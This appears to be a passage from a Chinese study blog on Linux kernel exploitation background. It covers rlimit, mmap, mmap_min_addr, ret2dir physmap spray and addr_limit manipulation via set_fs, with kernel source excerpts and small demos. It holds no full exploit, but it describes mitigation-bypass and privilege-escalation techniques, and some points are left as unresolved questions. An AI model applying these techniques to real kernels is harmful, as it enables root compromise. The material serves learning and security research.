<p>操作系统能提供的资源有限，所以必须限制每个进程使用的资源数，在linux上这个机制叫做<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://docs.oracle.com/cd/E19253-01/819-7053/faayq/index.html" >rlimit</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>。与之相关的一个结构体是：</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rlimit</span> &#123;</span></span><br><span class="line">	<span class="keyword">__kernel_ulong_t</span>	rlim_cur;			<span class="comment">// soft limit </span></span><br><span class="line">	<span class="keyword">__kernel_ulong_t</span>	rlim_max;			<span class="comment">// hard limit</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// soft limit &lt;= hard limit</span></span><br><span class="line"><span class="comment">// soft limit是普通用户可更改的，hard limit只有root用户才能更改</span></span><br></pre></td></tr></table></div></figure>
<p>更改rlimit值有两种方式：</p>
<ul>
<li><p>ulimit命令</p>
<blockquote>
<p>ulimit改变的是当前shell的resource limit，从而改变该shell启动的进程的resource limit</p>
</blockquote>
<figure class="highlight shell"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">ulimit</span> -a</span></span><br><span class="line">time(cpu-seconds)    unlimited</span><br><span class="line">file(blocks)         unlimited</span><br><span class="line">coredump(blocks)     0</span><br><span class="line">data(KiB)            unlimited</span><br><span class="line">stack(KiB)           8192</span><br><span class="line">lockedmem(KiB)       64</span><br><span class="line">nofiles(descriptors) 1024</span><br><span class="line">processes            4004</span><br><span class="line">sigpending           4004</span><br><span class="line">msgqueue(bytes)      819200</span><br><span class="line">maxnice              40</span><br><span class="line">maxrtprio            0</span><br><span class="line">resident-set(KiB)    unlimited</span><br><span class="line">address-space(KiB)   unlimited</span><br></pre></td></tr></table></div></figure></li>
<li><p>getlimit()和setlimit()两个API函数</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 更改soft limit的demo</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/resource.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">rlimit</span> <span class="title">rlim</span>;</span></span><br><span class="line">	<span class="keyword">int</span> ret;</span><br><span class="line"></span><br><span class="line">	ret = getrlimit(RLIMIT_NOFILE, &amp;rlim);   <span class="comment">// 读取RLIMIT_NOFILE这个资源的限制值</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//	printf(&quot;rlim.rlim_cur:%d\n&quot;,rlim.rlim_cur);</span></span><br><span class="line"><span class="comment">//	printf(&quot;rlim.rlim_max:%d\n&quot;,rlim.rlim_max);</span></span><br><span class="line"></span><br><span class="line">	rlim.rlim_cur = rlim.rlim_max;</span><br><span class="line">	setrlimit(RLIMIT_NOFILE, &amp;rlim);	<span class="comment">// 更改了soft limit后，重新写回内核</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

</li>
</ul>
<p>以上是对当前进程的resource limit进行修改，那么当我们需要更改其他进程的resource limit时，应该怎么办呢？对于高版本内核，可以使用prlimit()函数或prlimit命令。</p>
<p>查看某一进程的resource limit：<code>cat /proc/&lt;pid&gt;/limits</code></p>

        <h2 id="mmap函数"   >
          <a href="#mmap函数" class="heading-link"><i class="fas fa-link"></i></a><a href="#mmap函数" class="headerlink" title="mmap函数"></a>mmap函数</h2>
      <p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.cnblogs.com/huxiao-tee/p/4660352.html" >认真分析mmap：是什么 为什么 怎么用 </a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.cnblogs.com/xueqiuqiu/articles/12884736.html" >Linux 内存映射函数 mmap（）函数详解</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.jianshu.com/p/b24265a3a222" >你真的知道匿名映射是什么吗？</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>mmap将文件或设备映射进内存。但是对安全研究员来说，用的最多的是它的匿名映射（不将映射区与任何文件关联）。函数原型如下：</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">mmap</span><span class="params">(<span class="keyword">void</span> *start, <span class="keyword">size_t</span> length, <span class="keyword">int</span> prot, <span class="keyword">int</span> flags, <span class="keyword">int</span> fd, <span class="keyword">off_t</span> offset)</span></span>;</span><br><span class="line"><span class="comment">// start：映射区的开始地址。如果指定为NULL代表让系统自动选定地址，映射成功后返回该地址</span></span><br><span class="line"><span class="comment">// length：映射区的长度</span></span><br><span class="line"><span class="comment">// prot：期望的内存保护标志，不能与文件的打开模式冲突。PROT_EXEC/PROT_READ/PROT_WRITE/PROT_NONE</span></span><br><span class="line"><span class="comment">// flags：指定映射对象的类型，映射选项和映射页是否可以共享。MAP_FIXED/MAP_SHARED/MAP_PRIVATE/MAP_ANONYMOUS等</span></span><br><span class="line"><span class="comment">// fd：有效的文件描述词。如果MAP_ANONYMOUS被设定，为了兼容问题，其值应为-1</span></span><br><span class="line"><span class="comment">// offset：被映射对象内容的起点</span></span><br></pre></td></tr></table></div></figure>
<p>匿名映射是指在flags中指定了<code>MAP_ANONYMOUS</code>，并且fd被置为-1的情况。</p>

        <h2 id="mmap-min-addr"   >
          <a href="#mmap-min-addr" class="heading-link"><i class="fas fa-link"></i></a><a href="#mmap-min-addr" class="headerlink" title="mmap_min_addr"></a>mmap_min_addr</h2>
      <p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="http://richardustc.github.io/2013-05-21-2013-05-21-min-mmap-addr.html" >mmap x86小于0x10000的虚地址</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>使用<code>cat /proc/sys/vm/mmap_min_addr</code>查看当前系统中允许mmap的最低地址。有两种方法可以改变这个限制：</p>
<ol>
<li><p>通过<code>echo 4096 &gt; /proc/sys/vm/mmap_min_addr</code>更改最低地址的限制。</p>
</li>
<li><p>劫持内核控制流，更改mmap_min_addr的值</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">mmap_min_addr_handler</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// x0</span></span><br><span class="line"></span><br><span class="line">  result = proc_doulongvec_minmax();</span><br><span class="line">  MEMORY[<span class="number">0xFFFFFFC000652148</span>] = <span class="number">4096</span>i64;			<span class="comment">// 0xFFFFFFC000652148就是mmap_min_addr的地址</span></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>


</li>
</ol>

        <h2 id="ret2dir"   >
          <a href="#ret2dir" class="heading-link"><i class="fas fa-link"></i></a><a href="#ret2dir" class="headerlink" title="ret2dir"></a>ret2dir</h2>
      <blockquote>
<p>提出ret2dir这种利用方法的论文（USENIX 2014）：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.usenix.org/system/files/conference/usenixsecurity14/sec14-paper-kemerlis.pdf" >ret2dir: Rethinking Kernel Isolation</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
</blockquote>
<p>ret2dir中一个关键技术叫physmap spray。</p>
<p>physmap是64位linux内核内存布局中的一个区域，该区域内存比较特殊，称作”direct mapping of all physical memory”，大小是64TB。也就是说任意物理内存地址都可以映射到physmap虚拟内存中。</p>
<p>利用physmap这一区域，可以绕过一些linux内核漏洞缓解措施，如SMAP，SMEP等。攻击者通过mmap将payload放入虚拟内存（也在物理内存中），相应地一定能在physmap中找到这些payload，从而达到在内核中访问用户态数据或执行用户态代码的目的。</p>
<p>通过如下文章中的小实验来了解physmap：</p>
<ul>
<li><p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.jianshu.com/p/3c662b6163a7" >【linux内核漏洞利用】ret2dir利用方法</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
</li>
<li><p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/185408" >linux kernel pwn 之 ret2dir 学习</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
</li>
</ul>
<p>在对physmap的研究过程中，有以下几个问题：</p>
<ul>
<li><p>kmalloc的内存是否在physmap区域？</p>
<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在x86_64位ubuntu20.04虚拟机中，验证证明内核中kmalloc的内存在physmap区域。</span><br></pre></td></tr></table></div></figure></li>
<li><p>mmap的内存是否在physmap区域？</p>
<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">通过gdb dump内存，看到了mmap虚拟内存对应的内容</span><br></pre></td></tr></table></div></figure></li>
<li><p>mmap的内存，与kmalloc的内存，它们在physmap中的分布特点？</p>
<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">- kmalloc分配的内存遵循SLUB分配器的原则</span><br><span class="line">- mmap出来的内存，在vmware ubuntu中以1k为单位块，无规则分布在physmap区域（因为在物理内存中分布不均匀？）</span><br></pre></td></tr></table></div></figure>
<p>如果kmalloc的内存存在UAF，用户态mmap的大量内存在物理上可能跟UAF的某些区域有重叠。于是，就达到了在用户态操作mmap内存，能控制内核UAF堆中数据的目的。这也是CVE-2015-3636漏洞利用中，physmap spray使用到的根本原理。</p>
</li>
</ul>
<p>但是，涉及到linux内核内存管理的知识，目前我的储备为0，所以细节方面无法展开说明。这一知识盲区留待后续研究linux内存管理时再深入调试探究，参考这篇文章中提供的书籍和帖子学习：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://unix.stackexchange.com/questions/512849/whats-inside-the-kernel-part-of-virtual-memory-of-64-bit-linux-processes" >What’s inside the kernel part of virtual memory of 64 bit linux processes?</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>？？？但是，从kpwn这个题的环境来看，跟<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://bbs.pediy.com/thread-230298.htm%E4%B8%AD%E5%AF%B9physmap%E5%92%8Cslab%E7%9A%84%E6%8F%8F%E8%BF%B0%E5%B9%B6%E4%B8%8D%E4%B8%80%E6%A0%B7%E3%80%82" >https://bbs.pediy.com/thread-230298.htm中对physmap和slab的描述并不一样。</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>？？？kpwn：kmalloc的内存就在physmap中</p>
<p>？？？看雪：kmalloc的内存需要通过lifting才能跟physmap产生交集</p>

        <h2 id="socket的inet-ioctl"   >
          <a href="#socket的inet-ioctl" class="heading-link"><i class="fas fa-link"></i></a><a href="#socket的inet-ioctl" class="headerlink" title="socket的inet_ioctl"></a>socket的inet_ioctl</h2>
      
        <h3 id="inet-ioctl"   >
          <a href="#inet-ioctl" class="heading-link"><i class="fas fa-link"></i></a><a href="#inet-ioctl" class="headerlink" title="inet_ioctl"></a>inet_ioctl</h3>
      <p>linux-3.10-rc1/net/ipv4/af_inet.c中，有以下接口：</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">inet_ioctl</span><span class="params">(struct socket *sock, <span class="keyword">unsigned</span> <span class="keyword">int</span> cmd, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">sock</span> *<span class="title">sk</span> =</span> sock-&gt;sk;</span><br><span class="line">	<span class="keyword">int</span> err = <span class="number">0</span>;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">net</span> *<span class="title">net</span> =</span> sock_net(sk);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">switch</span> (cmd) &#123;</span><br><span class="line">	<span class="keyword">case</span> SIOCGSTAMP:</span><br><span class="line">		err = sock_get_timestamp(sk, (struct timeval __user *)arg);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> SIOCGSTAMPNS:</span><br><span class="line">		err = sock_get_timestampns(sk, (struct timespec __user *)arg);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	······</span><br></pre></td></tr></table></div></figure>

        <h3 id="sock-get-timestampns"   >
          <a href="#sock-get-timestampns" class="heading-link"><i class="fas fa-link"></i></a><a href="#sock-get-timestampns" class="headerlink" title="sock_get_timestampns"></a>sock_get_timestampns</h3>
      <p>linux-3.10-rc1/net/core/sock.c中，实现了sock_get_timestampns函数</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">timespec</span> &#123;</span></span><br><span class="line">        <span class="keyword">time_t</span>  tv_sec;         <span class="comment">/* seconds */</span></span><br><span class="line">        <span class="keyword">long</span>    tv_nsec;        <span class="comment">/* nanoseconds */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sock_get_timestampns</span><span class="params">(struct sock *sk, struct timespec __user *userstamp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">timespec</span> <span class="title">ts</span>;</span></span><br><span class="line">	<span class="keyword">if</span> (!sock_flag(sk, SOCK_TIMESTAMP))</span><br><span class="line">		sock_enable_timestamp(sk, SOCK_TIMESTAMP);</span><br><span class="line">	ts = ktime_to_timespec(sk-&gt;sk_stamp);</span><br><span class="line">	<span class="keyword">if</span> (ts.tv_sec == <span class="number">-1</span>)</span><br><span class="line">		<span class="keyword">return</span> -ENOENT;</span><br><span class="line">	<span class="keyword">if</span> (ts.tv_sec == <span class="number">0</span>) &#123;</span><br><span class="line">		sk-&gt;sk_stamp = ktime_get_real();</span><br><span class="line">		ts = ktime_to_timespec(sk-&gt;sk_stamp);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> copy_to_user(userstamp, &amp;ts, <span class="keyword">sizeof</span>(ts)) ? -EFAULT : <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(sock_get_timestampns);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> (BITS_PER_LONG == 64) || defined(CONFIG_KTIME_SCALAR)</span></span><br><span class="line"><span class="comment">/* Map the ktime_t to timespec conversion to ns_to_timespec function */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ktime_to_timespec(kt)		ns_to_timespec((kt).tv64)</span></span><br></pre></td></tr></table></div></figure>

        <h3 id="ns-to-timespec"   >
          <a href="#ns-to-timespec" class="heading-link"><i class="fas fa-link"></i></a><a href="#ns-to-timespec" class="headerlink" title="ns_to_timespec"></a>ns_to_timespec</h3>
      <p>linux-3.10-rc1/kernel/time.cz中，实现了ns_to_timespec函数</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">union</span> <span class="title">ktime</span> <span class="title">ktime_t</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">union</span> <span class="title">ktime</span> &#123;</span></span><br><span class="line">	s64	tv64;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> BITS_PER_LONG != 64 &amp;&amp; !defined(CONFIG_KTIME_SCALAR)</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">ifdef</span> __BIG_ENDIAN</span></span><br><span class="line">	s32	sec, nsec;</span><br><span class="line"><span class="meta"># <span class="meta-keyword">else</span></span></span><br><span class="line">	s32	nsec, sec;</span><br><span class="line"><span class="meta"># <span class="meta-keyword">endif</span></span></span><br><span class="line">	&#125; tv;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function">struct timespec <span class="title">ns_to_timespec</span><span class="params">(<span class="keyword">const</span> s64 nsec)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">timespec</span> <span class="title">ts</span>;</span></span><br><span class="line">	s32 rem;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!nsec)</span><br><span class="line">		<span class="keyword">return</span> (struct timespec) &#123;<span class="number">0</span>, <span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">	ts.tv_sec = div_s64_rem(nsec, NSEC_PER_SEC, &amp;rem);</span><br><span class="line">	<span class="keyword">if</span> (unlikely(rem &lt; <span class="number">0</span>)) &#123;</span><br><span class="line">		ts.tv_sec--;</span><br><span class="line">		rem += NSEC_PER_SEC;</span><br><span class="line">	&#125;</span><br><span class="line">	ts.tv_nsec = rem;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> ts;</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(ns_to_timespec);</span><br></pre></td></tr></table></div></figure>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.coolcou.com/linux-kernel/linux-kernel-timing-mechanism-api/the-linux-kernel-ns-to-timespec.html" >Linux内核 ns_to_timespec()</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>该函数的作用是将参数的时间（纳秒）用timespec结构体来表示，结构体如下</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">timespec</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">__kernel_time_t</span>       tv_sec;         <span class="comment">/*秒数*/</span></span><br><span class="line">    <span class="keyword">long</span>                    tv_nsec;        <span class="comment">/*纳秒数*/</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></div></figure>
<p>通过编写一个简单的内核模块，弄明白这个函数的用法</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;linux/time.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> __init <span class="title">ns_to_timespec_init</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">timespec</span> <span class="title">ts</span>;</span>           <span class="comment">//声明变量，用于保存函数执行结果</span></span><br><span class="line">    <span class="keyword">const</span> s64 nsec=<span class="number">1001000000</span>;    <span class="comment">//1001000000，定义64位有符号整数，作为函数的参数</span></span><br><span class="line">    printk(<span class="string">&quot;ns_to_timespec begin.\n&quot;</span>);</span><br><span class="line">    ts=ns_to_timespec(nsec);      <span class="comment">//调用函数，将参数表示的时间转换成用timespec表示的时间</span></span><br><span class="line">    printk(<span class="string">&quot;the value of the struct timespec is:\n&quot;</span>); <span class="comment">//显示转换结果</span></span><br><span class="line">    printk(<span class="string">&quot;the tv_sec value is:%ld\n&quot;</span>, ts.tv_sec);    <span class="comment">//秒数，为1</span></span><br><span class="line">    printk(<span class="string">&quot;the tv_nsec value is:%ld\n&quot;</span>, ts.tv_nsec); <span class="comment">//纳秒数，为1000000</span></span><br><span class="line">    printk(<span class="string">&quot;ns_to_timespec over.\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> __exit <span class="title">ns_to_timespec_exit</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    printk(<span class="string">&quot;Goodbye ns_to_timespec\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">module_init(ns_to_timespec_init);</span><br><span class="line">module_exit(ns_to_timespec_exit);</span><br><span class="line"></span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;GPL&quot;</span>);</span><br></pre></td></tr></table></div></figure>



        <h2 id="addr-limit访问限制"   >
          <a href="#addr-limit访问限制" class="heading-link"><i class="fas fa-link"></i></a><a href="#addr-limit访问限制" class="headerlink" title="addr limit访问限制"></a>addr limit访问限制</h2>
      
        <h3 id="addr-limit是什么"   >
          <a href="#addr-limit是什么" class="heading-link"><i class="fas fa-link"></i></a><a href="#addr-limit是什么" class="headerlink" title="addr limit是什么"></a>addr limit是什么</h3>
      <p>addr_limit是thread_info中的一个值，它代表当前线程可访问的地址空间大小。x86_64架构下，在用户程序addr_limit为0x7ffffffff000，在内核addr_limit为0xffffffffffffffff。</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">mm_segment_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">thread_info</span> &#123;</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span>		flags;		<span class="comment">/* low level flags */</span></span><br><span class="line">	<span class="keyword">mm_segment_t</span>		addr_limit;	<span class="comment">/* address limit */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span>	*<span class="title">task</span>;</span>		<span class="comment">/* main task structure */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">exec_domain</span>	*<span class="title">exec_domain</span>;</span>	<span class="comment">/* execution domain */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">restart_block</span>	<span class="title">restart_block</span>;</span></span><br><span class="line">	<span class="keyword">int</span>			preempt_count;	<span class="comment">/* 0 =&gt; preemptable, &lt;0 =&gt; bug */</span></span><br><span class="line">	<span class="keyword">int</span>			cpu;		<span class="comment">/* cpu */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></div></figure>
<p>当用户态程序通过系统调用进入内核后，需要访问内核空间的数据时该怎么办呢？</p>
<blockquote>
<p>答：可以通过setfs()来改变addr_limit的值。相关定义如下：</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KERNEL_DS    ((mm_segment_t) &#123; ~0UL &#125;)        <span class="comment">/* cf. access_ok() */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> USER_DS        ((mm_segment_t) &#123; TASK_SIZE-1 &#125;)    <span class="comment">/* cf. access_ok() */</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> VERIFY_READ    0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> VERIFY_WRITE    1</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> get_ds()  (KERNEL_DS)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> get_fs()  (current_thread_info()-&gt;addr_limit)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> set_fs(x) (current_thread_info()-&gt;addr_limit = (x))</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TASK_SIZE           DEFAULT_TASK_SIZE </span></span><br></pre></td></tr></table></div></figure>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://blog.csdn.net/fu851523125/article/details/124738473" >利用CVE-2017-8890漏洞ROOT天猫魔屏A1</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>文章指出，当前有两种方式可以patch addr_limit的大小。这里我们关注第二种方法，通过调用了set_fs()的函数如kernel_setsockopt、kernel_sock_ioctl来更改addr_limit。</p>
</blockquote>

        <h3 id="kernel-setsockopt"   >
          <a href="#kernel-setsockopt" class="heading-link"><i class="fas fa-link"></i></a><a href="#kernel-setsockopt" class="headerlink" title="kernel_setsockopt"></a>kernel_setsockopt</h3>
      <p>kernel_setsockopt()函数的源码：</p>
